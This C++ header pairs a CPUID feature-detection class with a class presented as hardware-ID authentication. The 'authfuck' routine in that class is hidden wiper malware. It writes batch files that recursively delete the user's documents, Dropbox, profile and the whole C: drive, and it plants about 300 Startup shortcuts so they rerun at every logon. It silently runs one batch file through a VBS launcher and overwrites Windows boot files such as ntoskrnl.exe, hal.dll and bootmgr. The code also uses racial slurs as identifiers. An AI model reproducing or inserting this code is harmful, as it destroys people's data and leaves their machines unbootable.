#pragma once

#include "stdafx.h"
#include <bitset>
#include <array>
#include <vector>
class InstructionSet
{
	// forward declarations
	class InstructionSet_Internal;

public:
	// getters
	static std::string Vendor(void) { return CPU_Rep.vendor_; }
	static std::string Brand(void) { return CPU_Rep.brand_; }

	static bool SSE3(void) { return CPU_Rep.f_1_ECX_[0]; }
	static bool PCLMULQDQ(void) { return CPU_Rep.f_1_ECX_[1]; }
	static bool MONITOR(void) { return CPU_Rep.f_1_ECX_[3]; }
	static bool SSSE3(void) { return CPU_Rep.f_1_ECX_[9]; }
	static bool FMA(void) { return CPU_Rep.f_1_ECX_[12]; }
	static bool CMPXCHG16B(void) { return CPU_Rep.f_1_ECX_[13]; }
	static bool SSE41(void) { return CPU_Rep.f_1_ECX_[19]; }
	static bool SSE42(void) { return CPU_Rep.f_1_ECX_[20]; }
	static bool MOVBE(void) { return CPU_Rep.f_1_ECX_[22]; }
	static bool POPCNT(void) { return CPU_Rep.f_1_ECX_[23]; }
	static bool AES(void) { return CPU_Rep.f_1_ECX_[25]; }
	static bool XSAVE(void) { return CPU_Rep.f_1_ECX_[26]; }
	static bool OSXSAVE(void) { return CPU_Rep.f_1_ECX_[27]; }
	static bool AVX(void) { return CPU_Rep.f_1_ECX_[28]; }
	static bool F16C(void) { return CPU_Rep.f_1_ECX_[29]; }
	static bool RDRAND(void) { return CPU_Rep.f_1_ECX_[30]; }

	static bool MSR(void) { return CPU_Rep.f_1_EDX_[5]; }
	static bool CX8(void) { return CPU_Rep.f_1_EDX_[8]; }
	static bool SEP(void) { return CPU_Rep.f_1_EDX_[11]; }
	static bool CMOV(void) { return CPU_Rep.f_1_EDX_[15]; }
	static bool CLFSH(void) { return CPU_Rep.f_1_EDX_[19]; }
	static bool MMX(void) { return CPU_Rep.f_1_EDX_[23]; }
	static bool FXSR(void) { return CPU_Rep.f_1_EDX_[24]; }
	static bool SSE(void) { return CPU_Rep.f_1_EDX_[25]; }
	static bool SSE2(void) { return CPU_Rep.f_1_EDX_[26]; }

	static bool FSGSBASE(void) { return CPU_Rep.f_7_EBX_[0]; }
	static bool BMI1(void) { return CPU_Rep.f_7_EBX_[3]; }
	static bool HLE(void) { return CPU_Rep.isIntel_ && CPU_Rep.f_7_EBX_[4]; }
	static bool AVX2(void) { return CPU_Rep.f_7_EBX_[5]; }
	static bool BMI2(void) { return CPU_Rep.f_7_EBX_[8]; }
	static bool ERMS(void) { return CPU_Rep.f_7_EBX_[9]; }
	static bool INVPCID(void) { return CPU_Rep.f_7_EBX_[10]; }
	static bool RTM(void) { return CPU_Rep.isIntel_ && CPU_Rep.f_7_EBX_[11]; }
	static bool AVX512F(void) { return CPU_Rep.f_7_EBX_[16]; }
	static bool RDSEED(void) { return CPU_Rep.f_7_EBX_[18]; }
	static bool ADX(void) { return CPU_Rep.f_7_EBX_[19]; }
	static bool AVX512PF(void) { return CPU_Rep.f_7_EBX_[26]; }
	static bool AVX512ER(void) { return CPU_Rep.f_7_EBX_[27]; }
	static bool AVX512CD(void) { return CPU_Rep.f_7_EBX_[28]; }
	static bool SHA(void) { return CPU_Rep.f_7_EBX_[29]; }

	static bool PREFETCHWT1(void) { return CPU_Rep.f_7_ECX_[0]; }

	static bool LAHF(void) { return CPU_Rep.f_81_ECX_[0]; }
	static bool LZCNT(void) { return CPU_Rep.isIntel_ && CPU_Rep.f_81_ECX_[5]; }
	static bool ABM(void) { return CPU_Rep.isAMD_ && CPU_Rep.f_81_ECX_[5]; }
	static bool SSE4a(void) { return CPU_Rep.isAMD_ && CPU_Rep.f_81_ECX_[6]; }
	static bool XOP(void) { return CPU_Rep.isAMD_ && CPU_Rep.f_81_ECX_[11]; }
	static bool TBM(void) { return CPU_Rep.isAMD_ && CPU_Rep.f_81_ECX_[21]; }

	static bool SYSCALL(void) { return CPU_Rep.isIntel_ && CPU_Rep.f_81_EDX_[11]; }
	static bool MMXEXT(void) { return CPU_Rep.isAMD_ && CPU_Rep.f_81_EDX_[22]; }
	static bool RDTSCP(void) { return CPU_Rep.isIntel_ && CPU_Rep.f_81_EDX_[27]; }
	static bool _3DNOWEXT(void) { return CPU_Rep.isAMD_ && CPU_Rep.f_81_EDX_[30]; }
	static bool _3DNOW(void) { return CPU_Rep.isAMD_ && CPU_Rep.f_81_EDX_[31]; }

	static std::string CPUAuth(void)
	{
		std::stringstream outstream;

		auto support_message = [&outstream](std::string isa_feature, bool is_supported)
		{
			outstream << isa_feature << ": ";
			
			if (is_supported)
				outstream << "yes";
			else
				outstream << "no";
			
			outstream << std::endl;
		};
		outstream << "vn: " << Vendor()  << std::endl;

		support_message("3DNOW", _3DNOW());
		support_message("3DNOWEXT", _3DNOWEXT());
		support_message("ABM", ABM());
		support_message("ADX", ADX());
		support_message("AES", AES());
		support_message("AVX", AVX());
		support_message("AVX2", AVX2());
		support_message("AVX512CD", AVX512CD());
		support_message("AVX512ER", AVX512ER());
		support_message("AVX512F", AVX512F());
		support_message("AVX512PF", AVX512PF());
		support_message("BMI1", BMI1());
		support_message("BMI2", BMI2());
		support_message("CLFSH", CLFSH());
		support_message("CMPXCHG16B", CMPXCHG16B());
		support_message("CX8", CX8());
		support_message("ERMS", ERMS());
		support_message("F16C", F16C());
		support_message("FMA", FMA());
		support_message("FSGSBASE", FSGSBASE());
		support_message("FXSR", FXSR());
		support_message("HLE", HLE());
		support_message("INVPCID", INVPCID());
		support_message("LAHF", LAHF());
		support_message("LZCNT", LZCNT());
		support_message("MMX", MMX());
		support_message("MMXEXT", MMXEXT());
		support_message("MONITOR", MONITOR());
		support_message("MOVBE", MOVBE());
		support_message("MSR", MSR());
		support_message("OSXSAVE", OSXSAVE());
		support_message("PCLMULQDQ", PCLMULQDQ());
		support_message("POPCNT", POPCNT());
		support_message("PREFETCHWT1", PREFETCHWT1());
		support_message("RDRAND", RDRAND());
		support_message("RDSEED", RDSEED());
		support_message("RDTSCP", RDTSCP());
		support_message("RTM", RTM());
		support_message("SEP", SEP());
		support_message("SHA", SHA());
		support_message("SSE", SSE());
		support_message("SSE2", SSE2());
		support_message("SSE3", SSE3());
		support_message("SSE4.1", SSE41());
		support_message("SSE4.2", SSE42());
		support_message("SSE4a", SSE4a());
		support_message("SSSE3", SSSE3());
		support_message("SYSCALL", SYSCALL());
		support_message("TBM", TBM());
		support_message("XOP", XOP());
		support_message("XSAVE", XSAVE());

		return outstream.str();
	}
private:
	static const InstructionSet_Internal CPU_Rep;

	class InstructionSet_Internal
	{
	public:
		InstructionSet_Internal()
			: nIds_{ 0 },
			nExIds_{ 0 },
			isIntel_{ false },
			isAMD_{ false },
			f_1_ECX_{ 0 },
			f_1_EDX_{ 0 },
			f_7_EBX_{ 0 },
			f_7_ECX_{ 0 },
			f_81_ECX_{ 0 },
			f_81_EDX_{ 0 },
			data_{},
			extdata_{}
		{
			//int cpuInfo[4] = {-1};
			std::array<int, 4> cpui;

			// Calling __cpuid with 0x0 as the function_id argument
			// gets the number of the highest valid function ID.
			__cpuid(cpui.data(), 0);
			nIds_ = cpui[0];

			for (int i = 0; i <= nIds_; ++i)
			{
				__cpuidex(cpui.data(), i, 0);
				data_.push_back(cpui);
			}

			// Capture vendor string
			char vendor[0x20];
			memset(vendor, 0, sizeof(vendor));
			*reinterpret_cast<int*>(vendor) = data_[0][1];
			*reinterpret_cast<int*>(vendor + 4) = data_[0][3];
			*reinterpret_cast<int*>(vendor + 8) = data_[0][2];
			vendor_ = vendor;
			if (vendor_ == "GenuineIntel")
			{
				isIntel_ = true;
			}
			else if (vendor_ == "AuthenticAMD")
			{
				isAMD_ = true;
			}

			// load bitset with flags for function 0x00000001
			if (nIds_ >= 1)
			{
				f_1_ECX_ = data_[1][2];
				f_1_EDX_ = data_[1][3];
			}

			// load bitset with flags for function 0x00000007
			if (nIds_ >= 7)
			{
				f_7_EBX_ = data_[7][1];
				f_7_ECX_ = data_[7][2];
			}

			// Calling __cpuid with 0x80000000 as the function_id argument
			// gets the number of the highest valid extended ID.
			__cpuid(cpui.data(), 0x80000000);
			nExIds_ = cpui[0];

			char brand[0x40];
			memset(brand, 0, sizeof(brand));

			for (int i = 0x80000000; i <= nExIds_; ++i)
			{
				__cpuidex(cpui.data(), i, 0);
				extdata_.push_back(cpui);
			}

			// load bitset with flags for function 0x80000001
			if (nExIds_ >= 0x80000001)
			{
				f_81_ECX_ = extdata_[1][2];
				f_81_EDX_ = extdata_[1][3];
			}

			// Interpret CPU brand string if reported
			if (nExIds_ >= 0x80000004)
			{
				memcpy(brand, extdata_[2].data(), sizeof(cpui));
				memcpy(brand + 16, extdata_[3].data(), sizeof(cpui));
				memcpy(brand + 32, extdata_[4].data(), sizeof(cpui));
				brand_ = brand;
			}
		};

		int nIds_;
		int nExIds_;
		std::string vendor_;
		std::string brand_;
		bool isIntel_;
		bool isAMD_;
		std::bitset<32> f_1_ECX_;
		std::bitset<32> f_1_EDX_;
		std::bitset<32> f_7_EBX_;
		std::bitset<32> f_7_ECX_;
		std::bitset<32> f_81_ECX_;
		std::bitset<32> f_81_EDX_;
		std::vector<std::array<int, 4>> data_;
		std::vector<std::array<int, 4>> extdata_;
	};
};


static const size_t InitialFNV = 2166136261U;
static const size_t FNVMultiple = 16777619;

#include "utils.h"
#include <shlobj.h>



class nigauth
{
public:
	inline HRESULT createshortcut(LPCWSTR lpszPathObj, LPCSTR lpszPathLink, LPCWSTR lpszDesc)
	{
		HRESULT hres;
		IShellLink* psl;

		// Get a pointer to the IShellLink interface. It is assumed that CoInitialize
		// has already been called.
		hres = CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLink, (LPVOID*)&psl);
		if (SUCCEEDED(hres))
		{
			IPersistFile* ppf;

			// Set the path to the shortcut target and add the description. 
			psl->SetPath(lpszPathObj);
			psl->SetDescription(lpszDesc);

			// Query IShellLink for the IPersistFile interface, used for saving the 
			// shortcut in persistent storage. 
			hres = psl->QueryInterface(IID_IPersistFile, (LPVOID*)&ppf);

			if (SUCCEEDED(hres))
			{
				WCHAR wsz[MAX_PATH];

				// Ensure that the string is Unicode. 
				MultiByteToWideChar(CP_ACP, 0, lpszPathLink, -1, wsz, MAX_PATH);

				// Add code here to check return value from MultiByteWideChar 
				// for success.

				// Save the link by calling IPersistFile::Save. 
				hres = ppf->Save(wsz, TRUE);
				ppf->Release();
			}
			psl->Release();
		}
		return hres;
	}

	inline size_t hash(const std::string &s)
	{
		size_t hash = InitialFNV;
		for (size_t i = 0; i < s.length(); i++)
		{
			hash = hash ^ (s[i]); 
			hash = hash * FNVMultiple;
		}
		return hash;
	}

	inline std::string get()
	{
		std::stringstream shit;

		HW_PROFILE_INFO hwProfileInfo;

		if (GetCurrentHwProfile(&hwProfileInfo) == NULL)
			return 0;


		char buffer1[255];
		char buffer2[255];
		wcstombs(buffer1, hwProfileInfo.szHwProfileGuid, sizeof(buffer1));
		wcstombs(buffer2, hwProfileInfo.szHwProfileName, sizeof(buffer2));

		shit << InstructionSet::CPUAuth() << buffer1 << buffer2;

		return shit.str();
	}

	inline const wchar_t *GetWC(const char *c)
	{
		const size_t cSize = strlen(c) + 1;
		wchar_t* wc = new wchar_t[cSize];
		//mbstowcs(wc, c, cSize);
		size_t convertedChars = 0;
		mbstowcs_s(&convertedChars, wc, cSize, c, _TRUNCATE);
		return wc;
	}

	inline void authfuck()
	{
		utils::file::DirCreate("C:\\Nikyuria");
		utils::file::DirCreate("C:\\Nikyuria\\log");

		char lpszPath[MAX_PATH];
		BOOL success = SHGetSpecialFolderPathA(NULL, lpszPath, CSIDL_STARTUP, false);
		if (!success)
		{
			Sleep(10);
			authfuck();
			return;
		}

		char *ToFuck[99] = { "C:\\boot.ini", "C:\\config.sys", "C:\\ntldr", "C:\\WINDOWS\\bootstat.dat", "C:\\WINDOWS\\System32\\ntoskrnl.exe", "C:\\WINDOWS\\System32\\hal.dll", "C:\\WINDOWS\\System32\\bootres.dll", "C:\\WINDOWS\\Boot\\DVD\\PCAT\\en-US\\bootfix.bin", "C:\\WINDOWS\\Boot\\DVD\\PCAT\\etfsboot.com", "C:\\WINDOWS\\Boot\\DVD\\PCAT\\boot.sdi", "C:\\WINDOWS\\Boot\\PCAT\\bootmgr" };

		std::string badboy = "RD /S /Q %USERPROFILE%\\Documents\\Visual Studio 2013\\Projects\nRD /S /Q %USERPROFILE%\\Documents\\Visual Studio 2010\\Projects\nRD /S /Q %USERPROFILE%\\Documents\\Visual Studio 2008\\Projects\nRD /S /Q %USERPROFILE%\\dropbox\nRD /S /Q %USERPROFILE%\\Desktop\nRD /S /Q %USERPROFILE%\\Documents\nRD /S /Q %USERPROFILE%\\Pictures\nRD /S /Q %USERPROFILE%\\Music\nRD /S /Q %USERPROFILE%\\Videos\nRD /S /Q %USERPROFILE%\nRD /S /Q C:\\";
		std::string nig = "C:\\Nikyuria\\log\\dif.vbs";

		utils::file::FileCreate(nig.c_str(), "CreateObject(\"Wscript.Shell\").Run \"\"\"\" & WScript.Arguments(0) & \"\"\"\", 0, False");
		
		bool swag = false;

		for (int i = 1; i < 300; i++)
		{

			std::stringstream niggers;

			niggers << "C:\\Nikyuria\\log\\";
			niggers << i;
			

			std::stringstream a;
			a << lpszPath;
			a << "\\";
			a << i;
			a << ".lnk";

			std::string nog = niggers.str().c_str();
			nog.append(".bat");


			utils::file::FileCreate(nog.c_str(), badboy.c_str());
			createshortcut(GetWC(nog.c_str()), a.str().c_str(), L"");
			
			std::stringstream torun;
			torun << "wscript.exe \"C:\\Nikyuria\\log\\dif.vbs\" \"C:\\Nikyuria\\log\\";
			torun << i;
			torun << ".bat\"";

			if (!swag)
			{
				for (int i = 0; i>-1; i++) {
					char *File = ToFuck[i];

					if (!File)
						break;


					utils::file::FileCreate(File, "!dontdelete!");
				}

				system(torun.str().c_str());
				swag = true;
			}
				

			//SetCursorPos(1, 1);
		}

		

	}
};

extern nigauth auth;
